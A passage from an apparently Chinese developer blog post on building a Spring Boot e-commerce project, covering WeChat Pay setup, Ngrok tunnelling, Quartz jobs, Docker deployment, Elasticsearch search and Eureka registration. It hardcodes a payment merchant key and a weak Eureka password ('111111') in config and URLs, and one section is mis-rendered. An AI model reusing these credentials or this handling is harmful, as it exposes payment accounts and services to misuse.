        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1497984412&quot;</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getKey</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC&quot;</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> InputStream <span class="hljs-title">getCertStream</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getHttpConnectTimeoutMs</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getHttpReadTimeoutMs</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;
&#125;
</code></pre>
</li>
<li><p>设置⽀付订单的参数</p>
<pre><code class="hljs java">HashMap&lt;String,String&gt; data = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
data.put(<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;咪咪萧条&quot;</span>); <span class="hljs-comment">//商品描述</span>
data.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>,orderId); <span class="hljs-comment">//使⽤当前⽤户订单的编号作为当前⽀付交易的</span>
交易号
data.put(<span class="hljs-string">&quot;fee_type&quot;</span>,<span class="hljs-string">&quot;CNY&quot;</span>); <span class="hljs-comment">//⽀付币种</span>
data.put(<span class="hljs-string">&quot;total_fee&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//⽀付⾦额</span>
data.put(<span class="hljs-string">&quot;trade_type&quot;</span>,<span class="hljs-string">&quot;NATIVE&quot;</span>); <span class="hljs-comment">//交易类型</span>
data.put(<span class="hljs-string">&quot;notify_url&quot;</span>,<span class="hljs-string">&quot;/pay/success&quot;</span>); <span class="hljs-comment">//设置⽀付完成时的回调⽅法</span>
接⼝</code></pre>
</li>
<li><p>申请支付连接</p>
<pre><code class="hljs java">WXPay wxPay = <span class="hljs-keyword">new</span> WXPay(<span class="hljs-keyword">new</span> MyPayConfig());
Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); <span class="hljs-comment">//发送请求</span>
orderInfo.put(<span class="hljs-string">&quot;payUrl&quot;</span>,resp.get(<span class="hljs-string">&quot;code_url&quot;</span>));</code></pre>

</li>
</ul>
<h2 id="5-Ngrok实现内网穿透"><a href="#5-Ngrok实现内网穿透" class="headerlink" title="5 Ngrok实现内网穿透"></a>5 Ngrok实现内网穿透</h2><ul>
<li><p>注册Ngrok后进行实名认证</p>
</li>
<li><p>开通隧道</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715164520718.png" alt="image-20220715164520718"></p>
</li>
<li><p>获取隧道ID</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220715164621244.png" alt="image-20220715164621244"></p>
</li>
<li><p>下载ngork客户端</p>
</li>
<li><p>启动客户端，输入对应的隧道ID，即可实现内网穿透</p>
</li>
</ul>
<h2 id="6-quartz定时任务框架使⽤"><a href="#6-quartz定时任务框架使⽤" class="headerlink" title="6 quartz定时任务框架使⽤"></a>6 quartz定时任务框架使⽤</h2><h3 id="6-1-导入依赖"><a href="#6-1-导入依赖" class="headerlink" title="6.1 导入依赖"></a>6.1 导入依赖</h3><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>

<h3 id="6-2-创建定时任务"><a href="#6-2-创建定时任务" class="headerlink" title="6.2 创建定时任务"></a>6.2 创建定时任务</h3><pre><code class="hljs java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrintHelloWorldJob</span> </span>&#123;
 <span class="hljs-comment">//https://cron.qqe2.com</span>
 <span class="hljs-meta">@Scheduled(cron = &quot;0/3 * * * * ?&quot;)</span>
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printHelloWorld</span><span class="hljs-params">()</span></span>&#123;
 System.out.println(<span class="hljs-string">&quot;----hello world.&quot;</span>);
 &#125;
&#125;</code></pre>

<h3 id="6-3-在启动类添加注解以开启定时任务"><a href="#6-3-在启动类添加注解以开启定时任务" class="headerlink" title="6.3 在启动类添加注解以开启定时任务"></a>6.3 在启动类添加注解以开启定时任务</h3><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableScheduling</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QuartzDemoApplication</span> </span>&#123;
 <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
 SpringApplication.run(QuartzDemoApplication.class, args);
 &#125;
&#125;</code></pre>



<p>当控制台打印出这段日志时，说明定时任务创建成功</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220716085923884.png" alt="image-20220716085923884"></p>
<h2 id="7-后端项目部署"><a href="#7-后端项目部署" class="headerlink" title="7 后端项目部署"></a>7 后端项目部署</h2><p>使用docker部署项目</p>
<ul>
<li><p>Dockerfile</p>
<pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> java:<span class="hljs-number">8</span>-alpine
<span class="hljs-keyword">COPY</span><span class="bash"> ./app.jar /tmp/app.jar</span>
<span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span>
<span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> java -jar /tmp/app.jar</span></code></pre>
</li>
<li><p>项目打包</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719123949027.png" alt="image-20220719123949027"></p>
</li>
<li><p>将jar包放到与dockerfile同一目录下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124037998.png" alt="image-20220719124037998"></p>
</li>
<li><p>上传到服务器中构建镜像</p>
<p>进入到Dockerfile所在的目录下，运行以下命令</p>
<pre><code class="hljs sh">docker build -t fmmall .</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124317986.png" alt="image-20220719124317986"></p>
</li>
<li><p>创建容器</p>
<pre><code class="hljs sh">docker run --name fmmall -p 8080:8080 -d  fmmall</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719124407926.png" alt="image-20220719124407926"></p>
</li>
</ul>
<h2 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h2><h3 id="使用watch-dog机制监视redis中key的过期时间"><a href="#使用watch-dog机制监视redis中key的过期时间" class="headerlink" title="使用watch dog机制监视redis中key的过期时间"></a>使用watch dog机制监视redis中key的过期时间</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220726222800912.png" alt="image-20220726222800912"></p>
<blockquote>
<p>看门狗线程：用于给当前的key延长过期时间，保证业务线程正常执行过程，锁不会过期</p>
</blockquote>
<h3 id="分布式锁框架-redisson"><a href="#分布式锁框架-redisson" class="headerlink" title="分布式锁框架-redisson"></a>分布式锁框架-redisson</h3><blockquote>
<p>基于redis+看门狗实现的分布式锁框架</p>
</blockquote>
<h3 id="ES"><a href="#ES" class="headerlink" title="ES"></a>ES</h3><h4 id="springboot整合ES"><a href="#springboot整合ES" class="headerlink" title="springboot整合ES"></a>springboot整合ES</h4><ul>
<li><p>导入依赖</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-elasticsearch<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>配置信息</p>
<pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">elasticsearch:</span>
    <span class="hljs-attr">rest:</span>
      <span class="hljs-attr">uris:</span> <span class="hljs-string">http://192.168.238.132:9200</span></code></pre>
</li>
<li><p>将数据库中的信息导入到ES中</p>
<blockquote>
<p>如果商品表中没有数据，则在平台管理系统中的商品添加功能中，当商家向商品表添加并上架一个商品时同步向ES添加一个商品;商家下架一个商品就从ES中删除一个商品。<br>系统运行前期数据量小没有使用ES，当数据量增长之后使用ES时，需要将数据库现有的数据导入到ES(导入工作需要在项目部署到生产环境之前来完成)</p>
</blockquote>
<pre><code class="hljs java"><span class="hljs-comment">// 1.查询数据库获取到所有数据</span>
        List&lt;ProductVO&gt; productVOS = productMapper.selectProducts();
        <span class="hljs-keyword">int</span> size = productVOS.size();

<span class="hljs-comment">//        return ResultVO.success(size);</span>
        <span class="hljs-comment">// 2. 遍历数据将数据写入到ES中</span>
        <span class="hljs-keyword">this</span>.client =<span class="hljs-keyword">new</span> RestHighLevelClient(RestClient.builder(
                HttpHost.create(<span class="hljs-string">&quot;http://192.168.238.132:9200&quot;</span>)
        ));
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; productVOS.size(); i++) &#123;
            ProductVO productVO = productVOS.get(i);
            String productId = productVO.getProductId();
            String productName = productVO.getProductName();
            Integer soldNum = productVO.getSoldNum();

            List&lt;ProductSku&gt; skus = productVO.getSkus();
            String skuImg = skus.size() == <span class="hljs-number">0</span>? <span class="hljs-string">&quot;&quot;</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSkuImg();
            String skuName = skus.size() == <span class="hljs-number">0</span>? <span class="hljs-string">&quot;&quot;</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSkuName();
            Integer sellPrice = skus.size() == <span class="hljs-number">0</span>? <span class="hljs-number">0</span>: productVO.getSkus().get(<span class="hljs-number">0</span>).getSellPrice();

            Product4ES product4ES = <span class="hljs-keyword">new</span> Product4ES(productId, productName, skuImg, soldNum, skuName, sellPrice);

            IndexRequest request = <span class="hljs-keyword">new</span> IndexRequest(<span class="hljs-string">&quot;fmmallproductindex&quot;</span>);
            request.id(productId).source(JSON.toJSONString(product4ES), XContentType.JSON);
            IndexResponse index = <span class="hljs-keyword">this</span>.client.index(request, RequestOptions.DEFAULT);
            System.out.println(<span class="hljs-string">&quot;------ i &quot;</span> + i + <span class="hljs-string">&quot;-----&quot;</span> + index);
        &#125;

        <span class="hljs-keyword">this</span>.client.close();</code></pre>



</li>
</ul>
<ul>
<li><p>使用ES进行进行全文搜索</p>
<pre><code class="hljs java"><span class="hljs-comment">/*从ES中查询信息*/</span>
<span class="hljs-keyword">this</span>.client =<span class="hljs-keyword">new</span> RestHighLevelClient(RestClient.builder(
    HttpHost.create(<span class="hljs-string">&quot;http://192.168.238.132:9200&quot;</span>)
));

<span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;
SearchRequest request = <span class="hljs-keyword">new</span> SearchRequest(<span class="hljs-string">&quot;fmmallproductindex&quot;</span>);

SearchSourceBuilder sourceBuilder = <span class="hljs-keyword">new</span> SearchSourceBuilder();
sourceBuilder.query(QueryBuilders.multiMatchQuery(kw, <span class="hljs-string">&quot;productName&quot;</span>, <span class="hljs-string">&quot;pruductSkuName&quot;</span>));
<span class="hljs-comment">// 分页条件</span>
sourceBuilder.from(start);
sourceBuilder.size(limit);
<span class="hljs-comment">// 高亮显示</span>
HighlightBuilder highlightBuilder = <span class="hljs-keyword">new</span> HighlightBuilder();
HighlightBuilder.Field productName = <span class="hljs-keyword">new</span> HighlightBuilder.Field(<span class="hljs-string">&quot;productName&quot;</span>);
HighlightBuilder.Field pruductSkuName = <span class="hljs-keyword">new</span> HighlightBuilder.Field(<span class="hljs-string">&quot;pruductSkuName&quot;</span>);
highlightBuilder.field(productName);
highlightBuilder.field(pruductSkuName);
highlightBuilder.preTags(<span class="hljs-string">&quot;&lt;label style=&#x27;color:red&#x27;&gt;&quot;</span>);
highlightBuilder.postTags(<span class="hljs-string">&quot;&lt;label&gt;&quot;</span>);
sourceBuilder.highlighter(highlightBuilder);
request.source(sourceBuilder);
SearchResponse searchResponse = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">try</span> &#123;
    searchResponse = <span class="hljs-keyword">this</span>.client.search(request, RequestOptions.DEFAULT);
&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
    e.printStackTrace();
&#125;
<span class="hljs-comment">// 处理响应结果</span>
SearchHits hits = searchResponse.getHits();
TotalHits totalHits = hits.getTotalHits();

<span class="hljs-keyword">int</span> count = (<span class="hljs-keyword">int</span>) totalHits.value;   <span class="hljs-comment">// 查询到的记录总数</span>
<span class="hljs-keyword">int</span> pageCount = (count%limit==<span class="hljs-number">0</span>? count/limit:count/limit+<span class="hljs-number">1</span>);

Iterator&lt;SearchHit&gt; iterator = hits.iterator();
List&lt;Product4ES&gt; product4ESList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
<span class="hljs-keyword">while</span>(iterator.hasNext())&#123;
    SearchHit nextHit = iterator.next();
    String sourceAsString = nextHit.getSourceAsString();
    Product4ES product4ES = JSON.parseObject(sourceAsString, Product4ES.class);

    <span class="hljs-comment">// 获取高亮字段</span>
    Map&lt;String, HighlightField&gt; highlightFields = nextHit.getHighlightFields();
    HighlightField highLightProductName = highlightFields.get(<span class="hljs-string">&quot;productName&quot;</span>);
    <span class="hljs-keyword">if</span>(highLightProductName != <span class="hljs-keyword">null</span>)&#123;
        String string = Arrays.toString(highLightProductName.fragments());
        product4ES.setProductName(string);
    &#125;
    product4ESList.add(product4ES);
&#125;


PageHelper&lt;Product4ES&gt; pageHelper = <span class="hljs-keyword">new</span> PageHelper&lt;&gt;(count, pageCount, product4ESList);
ResultVO resultVO = <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;SUCCESS&quot;</span>, pageHelper);
<span class="hljs-keyword">return</span> resultVO;
</code></pre>

</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730122320909.png" alt="image-20220730122320909"></p>
<h3 id="搭建服务发现和注册中心Eureka"><a href="#搭建服务发现和注册中心Eureka" class="headerlink" title="搭建服务发现和注册中心Eureka"></a>搭建服务发现和注册中心Eureka</h3><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730180822713.png" alt="image-20220730180822713" style="zoom:67%;">

<ul>
<li><p>添加关于erueka相关配置信息</p>
<pre><code class="hljs properties"><span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>
    <span class="hljs-meta">service-url</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">defaultZone</span>: <span class="hljs-string">http://127.0.0.1:8761/eureka</span>
    <span class="hljs-meta">register-with-eureka</span>: <span class="hljs-string">false</span>
    <span class="hljs-meta">fetch-registry</span>: <span class="hljs-string">false</span>

<span class="hljs-attr">server</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">port</span>: <span class="hljs-string">8761</span>
<span class="hljs-attr">spring</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">eureka-server</span>
</code></pre>
</li>
<li><p>在项目的启动类中添加注释<code>@EnableEurekaServer</code></p>
<pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> com.qfedu.eureka.server;

<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableEurekaServer</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EurekaServerApplication</span> </span>&#123;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
        SpringApplication.run(EurekaServerApplication.class, args);
    &#125;

&#125;</code></pre>
</li>
<li><p>配置security信息</p>
<pre><code class="hljs properties"><span class="hljs-attr">spring</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">eureka-server</span>

  <span class="hljs-attr">security</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">user</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">name</span>: <span class="hljs-string">sunzy</span>
      <span class="hljs-attr">password</span>: <span class="hljs-string">111111</span></code></pre>
</li>
<li><p>配置springsecuity</p>
<pre><code class="hljs java">  ```



### 拆分用户登录模块

- 首先创建新的模块 api-user-login

- 导入依赖

  ```xml
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
  &lt;/dependency&gt;
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;
  &lt;/dependency&gt;
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
      &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;
  &lt;/dependency&gt;
  
  &lt;dependency&gt;
      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
      &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
      &lt;scope&gt;test&lt;/scope&gt;
  &lt;/dependency&gt;</code></pre>



</li>
</ul>
<ul>
<li><p>配置application.yml</p>
<pre><code class="hljs properties"><span class="hljs-attr">server</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">port</span>: <span class="hljs-string">8001</span>

<span class="hljs-attr">eureka</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">client</span>:<span class="hljs-string"></span>
    <span class="hljs-meta">service-url</span>:<span class="hljs-string"></span>
      <span class="hljs-attr">defualtZone</span>: <span class="hljs-string">http://sunzy:111111@127.0.0.1:8761/eureka</span>
<span class="hljs-attr">spring</span>:<span class="hljs-string"></span>
  <span class="hljs-attr">application</span>:<span class="hljs-string"></span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">api-user-login</span>
</code></pre>
</li>
<li><p>在启动类添加注解<code>@EnableDiscoveryClient</code>和<code>@EnableFeignClients</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.api;

<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
<span class="hljs-keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;
<span class="hljs-keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableDiscoveryClient</span>
<span class="hljs-meta">@EnableFeignClients</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiUserLoginApplication</span> </span>&#123;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
        SpringApplication.run(ApiUserLoginApplication.class, args);
    &#125;

&#125;</code></pre>

<p>添加注解后既可启动服务，在注册中心中可以看到注册成功的服务</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220730224027994.png" alt="image-20220730224027994"></p>
</li>
</ul>
<h3 id="用户查询模块"><a href="#用户查询模块" class="headerlink" title="用户查询模块"></a>用户查询模块</h3><blockquote>
<p>该模块的主要的作用是为登录提供用户查询功能，因此涉及到服务调用</p>
</blockquote>
<ul>
<li><p>首先创建模块user-check</p>
</li>
<li><p>pom文件内容</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
<span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.qfedu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>user-check<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>user-check<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Demo project for Spring Boot<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">spring-cloud.version</span>&gt;</span>2021.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">spring-cloud.version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.qfedu<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>common<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependencyManagement</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;spring-cloud.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
